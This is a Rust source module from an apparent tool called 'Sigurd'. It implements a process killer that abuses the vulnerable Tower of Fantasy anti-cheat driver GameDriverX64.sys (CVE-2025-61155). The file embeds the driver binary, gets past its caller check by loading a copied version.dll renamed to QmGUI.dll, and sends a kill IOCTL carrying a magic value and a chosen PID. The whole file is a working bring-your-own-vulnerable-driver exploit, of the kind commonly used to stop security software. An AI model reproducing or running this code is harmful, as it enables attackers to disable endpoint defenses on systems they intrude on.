use std::{mem, ptr::null_mut};

use winapi::{
    ctypes::c_void, shared::minwindef::{DWORD, LPVOID, MAX_PATH, FALSE}, um::{
        fileapi::{CreateFileW, OPEN_EXISTING}, 
        sysinfoapi::GetSystemDirectoryA,
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, 
        ioapiset::DeviceIoControl,
        winnt::{GENERIC_READ, GENERIC_WRITE},
        winbase::CopyFileA,
        libloaderapi::LoadLibraryA
    }
};

use crate::{
    drivers::KillerDriver, trace, utils::{error::SigurdError, to_wstring}, warn
};

const DRIVER_NAME: &str = "GameDriverX64";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\HtAntiCheatDriver";
const IOCTL_KILL: u32 = 0x222040;

static DRIVER: &'static [u8] = include_bytes!("../../../drivers/GameDriverX64.sys");

#[repr(C, packed)]
struct payload {
    magic: DWORD,
    pid: DWORD, 
}

impl payload {
    fn new(pid: DWORD) -> Self {
        Self { 
            magic: 0xFA123456 as DWORD,
            pid, 
        }
    }
}

pub struct GameDriverX64 {
    device: *mut c_void,
}

impl GameDriverX64 {
    pub fn load_bypass(&self) -> Result<bool, SigurdError> {
        unsafe {
            let mut buf = [0i8; MAX_PATH as usize];

            let len = GetSystemDirectoryA(buf.as_mut_ptr(), MAX_PATH as u32);
            if len == 0 {
                return Err(SigurdError::default("GetSystemDirectoryA failed"));
            }

            let system_dir = std::ffi::CStr::from_ptr(buf.as_ptr());
            let src = match std::ffi::CString::new(format!(
                "{}\\version.dll",
                system_dir.to_string_lossy()
            )) {
                Ok(s) => s,
                Err(_e) => {
                    return Err(SigurdError::default("Can't convert to CString"));
                }
            };

            if CopyFileA(
                src.as_ptr(),
                b"QmGUI.dll\0".as_ptr() as *const i8,
                FALSE,
            ) == 0 {
                return Err(SigurdError::default("Can't copy version.dll and rename it to QmGUI.dll"));
            }

            let h = LoadLibraryA(b"QmGUI.dll\0".as_ptr() as *const i8);
            if h.is_null() {
                return Err(SigurdError::last("Can't load library"));
            } else {
                Ok(true)
            }
        }
    }
}

impl KillerDriver for GameDriverX64 {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        warn!("GameDriverX64 requires system restart to uninstall!");
        return Ok(Box::new(Self { device: 0 as *mut c_void }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            trace!("Init started!");
            let success = self.load_bypass()?;

            if success == true {
                trace!("Registred current process");
            } else {
                return Err(SigurdError::last("Failed to register current process"));
            }

            // Open GameDriverX64
            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ | GENERIC_WRITE, 
                0, 
                null_mut(), 
                OPEN_EXISTING, 
                0,
                null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get dervice handle"));
            }

            trace!("Got device handle");
            self.device = handle;

            return Ok(true);
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "Tower of Fantasy GameDriverX64.sys (CVE-2025-61155)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = DRIVER.to_vec();
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {    
            let mut input = payload::new(pid);

            let mut out = 0u32;
            let mut bytes = 0u32;
            let success = DeviceIoControl(
                self.device, 
                IOCTL_KILL, 
                &mut input as *mut _ as LPVOID, 
                mem::size_of::<payload>() as DWORD, 
                &mut out as *mut _ as *mut _, 
                4, 
                &mut bytes, 
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}
